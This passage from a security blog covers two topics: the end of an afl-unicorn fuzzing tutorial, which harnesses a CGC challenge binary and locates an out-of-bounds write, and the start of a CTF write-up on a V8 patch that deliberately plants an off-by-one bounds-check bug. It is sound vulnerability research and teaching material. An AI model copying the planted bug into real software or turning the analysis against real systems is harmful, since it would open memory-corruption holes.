class="line">        result = uc.emu_start(START_ADDRESS, END_ADDRESS, timeout=<span class="number">0</span>, count=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># If something went wrong during emulation a signal is raised to force this </span></span><br><span class="line">        <span class="comment"># script to crash in a way that AFL can detect ('uc.force_crash()' should be</span></span><br><span class="line">        <span class="comment"># called for any condition that you want AFL to treat as a crash).</span></span><br><span class="line">        print(<span class="string">"Execution failed with error: &#123;&#125;"</span>.format(e))</span><br><span class="line">        uc.dump_regs() </span><br><span class="line">        uc.force_crash(e)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Final register state:"</span>)    </span><br><span class="line">    uc.dump_regs()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Done."</span>)    </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>整体浏览一下，TODO的地方不多，加载context之类的工作，比如之前我们学习unicorn时候要做的很多分配栈地址之类的，都已经在unicorn_loader里给通过load我们之前dump出的context来自动完成了，简单快捷。</p><p>那么把每处TODO大概看看</p><ol><li>TODO: Apply constraints to mutated input here<br>我感觉没必要额外加什么约束，直接注释掉raise。</li><li>TODO: Set the input into the state so it will be handled<br>我们要fuzz的函数的参数此时都存在寄存器里，所以直接改掉寄存器的值就好。</li><li>TODO: Set start/end address here<br>这个就是我们刚刚断下来的地址就是起始地址，要fuzz的函数结束的地方就是终止地址。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-124208.png" alt=""></li><li>TODO: Setup hooks and handle anything you need to here<br>最麻烦的地方，和之前学习unicorn一样，有些指令还是要单独hook的。<br>另外就是之前说的，这个函数要先检查crc校验和，这个参数我们没做控制，直接把那个检查hook了然后跳过。</li></ol><p>hook crc校验和<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-125011.png" alt=""></p><p>hook malloc，好处是我们可以自己实现自己的Guard Page，从而在越界读写的时候立刻crash。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-130132.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-125907.jpg" alt=""></p><p>hook free<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-130219.png" alt=""></p><p>hook printf<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-130256.png" alt=""></p><p>hook cgc_transmit<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-05-132201.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"I"</span>, data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p32</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"I"</span>, num)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *  <span class="comment"># <span class="doctag">TODO:</span> Set correct architecture here as necessary</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> unicorn_loader </span><br><span class="line"></span><br><span class="line"><span class="comment"># Simple stand-in heap to prevent OS/kernel issues</span></span><br><span class="line">unicorn_heap = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start and end address of emulation</span></span><br><span class="line">START_ADDRESS = <span class="number">0x0804D106</span> <span class="comment"># <span class="doctag">TODO:</span> Set start address here</span></span><br><span class="line">END_ADDRESS   = <span class="number">0x0804D120</span> <span class="comment"># <span class="doctag">TODO:</span> Set end address here</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Address where checksum is checked and where it goes if it is valid</span></span><br><span class="line">CHKSUM_CMP_ADDR    = <span class="number">0x0804DA45</span></span><br><span class="line">CHKSUM_PASSED_ADDR = <span class="number">0x0804DA52</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Entry points of addresses of functions to hook</span></span><br><span class="line">MALLOC_ENTRY        = <span class="number">0x08049C40</span></span><br><span class="line">FREE_ENTRY          = <span class="number">0x08049980</span></span><br><span class="line">PRINTF_ENTRY        = <span class="number">0x0804AA60</span></span><br><span class="line">CGC_TRANSMIT_ENTRY  = <span class="number">0x0804A4C2</span></span><br><span class="line">CGC_TRANSMIT_PASSED = <span class="number">0x0804A4DC</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Implement target-specific hooks in here.</span></span><br><span class="line"><span class="string">    Stub out, skip past, and re-implement necessary functionality as appropriate</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unicorn_hook_instruction</span><span class="params">(uc, address, size, user_data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address == MALLOC_ENTRY:</span><br><span class="line">        print(<span class="string">"--- Rerouting call to malloc() @ 0x&#123;0:08x&#125; ---"</span>.format(address))</span><br><span class="line">        size = struct.unpack(<span class="string">"&lt;I"</span>, uc.mem_read(uc.reg_read(UC_X86_REG_ESP) + <span class="number">4</span>, <span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">        retval = unicorn_heap.malloc(size)</span><br><span class="line">        uc.reg_write(UC_X86_REG_EAX, retval)</span><br><span class="line">        uc.reg_write(UC_X86_REG_EIP, struct.unpack(<span class="string">"&lt;I"</span>, uc.mem_read(uc.reg_read(UC_X86_REG_ESP), <span class="number">4</span>))[<span class="number">0</span>])</span><br><span class="line">        uc.reg_write(UC_X86_REG_ESP, uc.reg_read(UC_X86_REG_ESP) + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Bypass these functions by jumping straight out of them - We can't (or don't want to) emulate them</span></span><br><span class="line">    <span class="keyword">elif</span> address == FREE_ENTRY <span class="keyword">or</span> address == PRINTF_ENTRY:</span><br><span class="line">        print(<span class="string">"--- Bypassing a function call that we don't want to emulate @ 0x&#123;0:08x&#125; ---"</span>.format(address))</span><br><span class="line">        uc.reg_write(UC_X86_REG_EIP, struct.unpack(<span class="string">"&lt;I"</span>, uc.mem_read(uc.reg_read(UC_X86_REG_ESP), <span class="number">4</span>))[<span class="number">0</span>])</span><br><span class="line">        uc.reg_write(UC_X86_REG_ESP, uc.reg_read(UC_X86_REG_ESP) + <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Bypass the checksum check</span></span><br><span class="line">    <span class="keyword">elif</span> address == CHKSUM_CMP_ADDR:</span><br><span class="line">        print(<span class="string">"--- Bypassing checksum validation @ 0x&#123;0:08x&#125; ---"</span>.format(address))</span><br><span class="line">        uc.reg_write(UC_X86_REG_EIP, CHKSUM_PASSED_ADDR)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Bypass the CGC_TRANSMIT_ENTRY check</span></span><br><span class="line">    <span class="keyword">elif</span> address == CGC_TRANSMIT_ENTRY:</span><br><span class="line">        print(<span class="string">"--- Bypassing CGC_TRANSMIT_ENTRY validation @ 0x&#123;0:08x&#125; ---"</span>.format(address))</span><br><span class="line">        uc.reg_write(UC_X86_REG_EIP, CGC_TRANSMIT_PASSED)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> address == START_ADDRESS:</span><br><span class="line">        print(<span class="string">'&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x'</span> %(address, size))</span><br><span class="line">        print(mu.mem_read(address,size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> Setup hooks and handle anything you need to here</span></span><br><span class="line">    <span class="comment">#    - For example, hook malloc/free/etc. and handle it internally</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------</span></span><br><span class="line"><span class="comment">#---- Main test function  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">'context_dir'</span>, type=str, help=<span class="string">"Directory containing process context"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'input_file'</span>, type=str, help=<span class="string">"Path to the file containing the mutated input content"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-d'</span>, <span class="string">'--debug'</span>, default=<span class="literal">False</span>, action=<span class="string">"store_true"</span>, help=<span class="string">"Dump trace info"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Loading context from &#123;&#125;"</span>.format(args.context_dir))</span><br><span class="line">    uc = unicorn_loader.AflUnicornEngine(args.context_dir, enable_trace=args.debug, debug_print=<span class="literal">False</span>)       </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Instantiate the hook function to avoid emulation errors</span></span><br><span class="line">    <span class="keyword">global</span> unicorn_heap</span><br><span class="line">    unicorn_heap = unicorn_loader.UnicornSimpleHeap(uc, debug_print=<span class="literal">True</span>)</span><br><span class="line">    uc.hook_add(UC_HOOK_CODE, unicorn_hook_instruction)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Execute 1 instruction just to startup the forkserver</span></span><br><span class="line">    <span class="comment"># <span class="doctag">NOTE:</span> This instruction will be executed again later, so be sure that</span></span><br><span class="line">    <span class="comment">#       there are no negative consequences to the overall execution state.</span></span><br><span class="line">    <span class="comment">#       If there are, change the later call to emu_start to no re-execute </span></span><br><span class="line">    <span class="comment">#       the first instruction.</span></span><br><span class="line">    print(<span class="string">"Starting the forkserver by executing 1 instruction"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        uc.emu_start(START_ADDRESS, <span class="number">0</span>, <span class="number">0</span>, count=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"ERROR: Failed to execute a single instruction (error: &#123;&#125;)!"</span>.format(e))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Allocate a buffer and load a mutated input and put it into the right spot</span></span><br><span class="line">    <span class="keyword">if</span> args.input_file:</span><br><span class="line">        print(<span class="string">"Loading input content from &#123;&#125;"</span>.format(args.input_file))</span><br><span class="line">        input_file = open(args.input_file, <span class="string">'rb'</span>)</span><br><span class="line">        input_content = input_file.read()</span><br><span class="line">        input_file.close()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Apply constraints to mutated input here</span></span><br><span class="line">        <span class="keyword">if</span> len(input_content) &gt; <span class="number">0xFF</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment"># raise exceptions.NotImplementedError('No constraints on the mutated inputs have been set!')</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Allocate a new buffer and put the input into it</span></span><br><span class="line">        buf_addr = unicorn_heap.malloc(len(input_content))</span><br><span class="line">        uc.mem_write(buf_addr, input_content)</span><br><span class="line">        print(<span class="string">"Allocated mutated input buffer @ 0x&#123;0:016x&#125;"</span>.format(buf_addr))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># <span class="doctag">TODO:</span> Set the input into the state so it will be handled</span></span><br><span class="line">        <span class="comment">#raise exceptions.NotImplementedError('The mutated input was not loaded into the Unicorn state!')</span></span><br><span class="line">        uc.reg_write(UC_X86_REG_EAX, buf_addr)</span><br><span class="line">        uc.reg_write(UC_X86_REG_DL, len(input_content))</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># Run the test</span></span><br><span class="line">    print(<span class="string">"Executing from 0x&#123;0:016x&#125; to 0x&#123;1:016x&#125;"</span>.format(START_ADDRESS, END_ADDRESS))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = uc.emu_start(START_ADDRESS, END_ADDRESS, timeout=<span class="number">0</span>, count=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># If something went wrong during emulation a signal is raised to force this </span></span><br><span class="line">        <span class="comment"># script to crash in a way that AFL can detect ('uc.force_crash()' should be</span></span><br><span class="line">        <span class="comment"># called for any condition that you want AFL to treat as a crash).</span></span><br><span class="line">        print(<span class="string">"Execution failed with error: &#123;&#125;"</span>.format(e))</span><br><span class="line">        uc.dump_regs() </span><br><span class="line">        uc.force_crash(e)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Final register state:"</span>)    </span><br><span class="line">    uc.dump_regs()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Done."</span>)    </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h4><p>运行fuzz<br>需要唯一些输入进去。<br>那就random一些就好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os, random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        size = random.randint(<span class="number">20</span>, <span class="number">50</span>)</span><br><span class="line">        os.system(<span class="string">f'dd if=/dev/urandom of=testcase/testcase_<span class="subst">&#123;i&#125;</span> count=2 bs=<span class="subst">&#123;size&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;afl-unicorn&#x2F;afl-fuzz -U -m none -i &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;testcase&#x2F; -o &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;fuzz_out&#x2F; -- python harness.py &#x2F;home&#x2F;sakura&#x2F;unicorn&#x2F;UnicornContext_20200405_045024&#x2F; @@</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-012549.png" alt=""><br>crash很多，跑了大概几秒钟，大概打开看看，定位一下漏洞点。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-013757.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-013900.png" alt=""><br>但问题来了，没有栈回溯，我怎么定位到漏洞点。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-014953.png" alt=""></p><p>我简单的排查了一下，因为这道题的代码量并不大，尤其是我hook的代码并不多，所以我可以trace每条指令，和执行时它的一些关键信息。<br>而这里比较简单的就是我review了一下memcpy的交叉引用，然后在new_packet里面找到了我要的。<br>因为我是打印了执行流的，我看了一下地址<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-015510.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-015151.png" alt=""><br>在我检索之后发现log里有call cgc_memcpy，并且里没有trace到它的下一条指令0x000000000804db8e<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-015604.png" alt=""><br>到这里基本上就可以知道漏洞点了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-015730.png" alt=""><br>简单的思考一下，pNewPacket的buf大小是0x40，也就是64字节。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-015909.png" alt=""><br>但是很显然，在cgc_receive_packet里是根本没有对其进行dataLen的校验的。换而言之，<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-04-06-020057.png" alt=""><br>这里cgc_g_packetHandlers是一个全局变量，用处大概是填充诸多类型的packetType用来进行check。<br>而只需要在pData第一个字节构造好type类型，就可以进入add_new_packet函数里，并造成一个oob write了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>afl-unicorn的局限性在于，它和unicorn一样，在你模拟执行的时候，必须hook一些函数来让它正常运行，为了尽可能简单的来模拟环境，你可能还需要去运行固件并dump内存上下文，这有时是困难的，起码我在刚开始研究afl-unicorn时候的初衷是因为我有一些东西不能直接跑起来。<br>此外在trace crash路径的时候，虽然我是逐指令hook的，但是事实上这样在遇到一些循环之类的时候会造成log爆炸的增长，我相信你不会想看到这种东西的。<br>所以还需要根据实际情况去hook需要hook的代码。<br>我已经很久没做任何逆向了，不过我有很多感兴趣的目标，我需要掌握的更多。</p><p>后续我可能还会再更新一篇关于afl-unicorn源码的笔记，不过可能会比较简单，因为我不是那种非常注意细节的人，我只关心我应该怎么改才能让我的工作跑起来。</p><p>这个系列不出意外我会长期更新，并会在适当的时候写一些我曾经使用过的，挖掘到了高质量浏览器漏洞的fuzz的内容，事实上都非常简单和有趣。</p><p>所有的代码可以在<a href="https://github.com/eternalsakura/sakura_all_fuzz" target="_blank" rel="noopener">这里</a>找到。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://eternal.red/2018/unicorn-engine-tutorial/" target="_blank" rel="noopener">http://eternal.red/2018/unicorn-engine-tutorial/</a></p><p><a href="https://hackernoon.com/afl-unicorn-part-2-fuzzing-the-unfuzzable-bea8de3540a5" target="_blank" rel="noopener">https://hackernoon.com/afl-unicorn-part-2-fuzzing-the-unfuzzable-bea8de3540a5</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sakuraのall-fuzz-afl-unicorn&quot;&gt;&lt;a href=&quot;#sakuraのall-fuzz-afl-unicorn&quot; class=&quot;headerlink&quot; title=&quot;sakuraのall fuzz:afl-unicorn&quot;&gt;&lt;/a&gt;sakur
      
    
    </summary>
    
    
      <category term="Fuzz" scheme="http://eternalsakura13.com/categories/Fuzz/"/>
    
    
      <category term="fuzz" scheme="http://eternalsakura13.com/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>qwb growupjs &amp; wctf independence_day writeup</title>
    <link href="http://eternalsakura13.com/2019/07/16/qwb%20growupjs%20&amp;%20wctf%20independence_day%20writeup/"/>
    <id>http://eternalsakura13.com/2019/07/16/qwb%20growupjs%20&amp;%20wctf%20independence_day%20writeup/</id>
    <published>2019-07-16T10:23:12.934Z</published>
    <updated>2019-07-17T08:08:25.590Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qwb-growupjs-amp-wctf-independence-day-writeup"><a href="#qwb-growupjs-amp-wctf-independence-day-writeup" class="headerlink" title="qwb growupjs &amp; wctf independence_day writeup"></a>qwb growupjs &amp; wctf independence_day writeup</h1><h2 id="qwb-growupjs"><a href="#qwb-growupjs" class="headerlink" title="qwb growupjs"></a>qwb growupjs</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a&#x2F;src&#x2F;compiler&#x2F;machine-operator-reducer.cc b&#x2F;src&#x2F;compiler&#x2F;machine-operator-reducer.cc</span><br><span class="line">index a6a8e87cf4..164ab44fab 100644</span><br><span class="line">--- a&#x2F;src&#x2F;compiler&#x2F;machine-operator-reducer.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;compiler&#x2F;machine-operator-reducer.cc</span><br><span class="line">@@ -291,7 +291,7 @@ Reduction MachineOperatorReducer::Reduce(Node* node) &#123;</span><br><span class="line">       if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  &#x2F;&#x2F; M &lt; x &#x3D;&gt; false</span><br><span class="line">       if (m.right().Is(0)) return ReplaceBool(false);          &#x2F;&#x2F; x &lt; 0 &#x3D;&gt; false</span><br><span class="line">       if (m.IsFoldable()) &#123;                                    &#x2F;&#x2F; K &lt; K &#x3D;&gt; K</span><br><span class="line">-        return ReplaceBool(m.left().Value() &lt; m.right().Value());</span><br><span class="line">+        return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1);</span><br><span class="line">       &#125;</span><br><span class="line">       if (m.LeftEqualsRight()) return ReplaceBool(false);  &#x2F;&#x2F; x &lt; x &#x3D;&gt; false</span><br><span class="line">       if (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;</span><br></pre></td></tr></table></figure><p>patch如上，实际上是在MachineOperatorReducer的这个case中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IrOpcode::kUint32LessThan: &#123;</span><br><span class="line">      <span class="function">Uint32BinopMatcher <span class="title">m</span><span class="params">(node)</span></span>;</span><br><span class="line">      <span class="keyword">if</span> (m.left().Is(kMaxUInt32)) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);  <span class="comment">// M &lt; x =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.right().Is(<span class="number">0</span>)) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);          <span class="comment">// x &lt; 0 =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.IsFoldable()) &#123;                                    <span class="comment">// K &lt; K =&gt; K</span></span><br><span class="line">        <span class="keyword">return</span> ReplaceBool(m.left().Value() &lt; m.right().Value()+<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (m.LeftEqualsRight()) <span class="keyword">return</span> ReplaceBool(<span class="literal">false</span>);  <span class="comment">// x &lt; x =&gt; false</span></span><br><span class="line">      <span class="keyword">if</span> (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue()) &#123;</span><br><span class="line">        <span class="function">Int32BinopMatcher <span class="title">mleft</span><span class="params">(m.left().node())</span></span>;</span><br><span class="line">        <span class="keyword">if</span> (mleft.right().HasValue()) &#123;</span><br><span class="line">          <span class="comment">// (x &gt;&gt; K) &lt; C =&gt; x &lt; (C &lt;&lt; K)</span></span><br><span class="line">          <span class="comment">// when C &lt; (M &gt;&gt; K)</span></span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">uint32_t</span> c = m.right().Value();</span><br><span class="line">          <span class="keyword">const</span> <span class="keyword">uint32_t</span> k = mleft.right().Value() &amp; <span class="number">0x1F</span>;</span><br><span class="line">          <span class="keyword">if</span> (c &lt; <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(kMaxInt &gt;&gt; k)) &#123;</span><br><span class="line">            node-&gt;ReplaceInput(<span class="number">0</span>, mleft.left().node());</span><br><span class="line">            node-&gt;ReplaceInput(<span class="number">1</span>, Uint32Constant(c &lt;&lt; k));</span><br><span class="line">            <span class="keyword">return</span> Changed(node);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// TODO(turbofan): else the comparison is always true.</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先这个patch很简单，就是本来如果是1&lt;1这样的kUint32LessThan比较，应该替换成false节点，而这里变成1&lt;2（<code>m.right().Value()+1)</code>），于是就替换成了true节点。<br>这个bug非常明显，但是如何利用呢？实际上对array边界的检查可以lower到Uint32LessThan节点，所以这实际上可以转化成一个array的off-by-one漏洞。<br>然后后续利用和<a href="http://eternalsakura13.com/2019/04/29/*ctf_oob/">*ctf 2019 OOB</a>中使用的方法一致。</p><h3 id="IR分析"><a href="#IR分析" class="headerlink" title="IR分析"></a>IR分析</h3><p>我做了几组case，先看一个比较简单的case</p><h4 id="case-1"><a href="#case-1" class="headerlink" title="case 1"></a>case 1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function main() &#123;</span><br><span class="line">    let arr &#x3D; [1.1, 2.2, 3.3, 4.4];</span><br><span class="line">    let idx &#x3D; 3;</span><br><span class="line">    return arr[idx];</span><br><span class="line">&#125;</span><br><span class="line">for (i &#x3D; 0; i &lt; 10000; i++)&#123;</span><br><span class="line">    main();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>typer phase<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-07-16-104131.png" 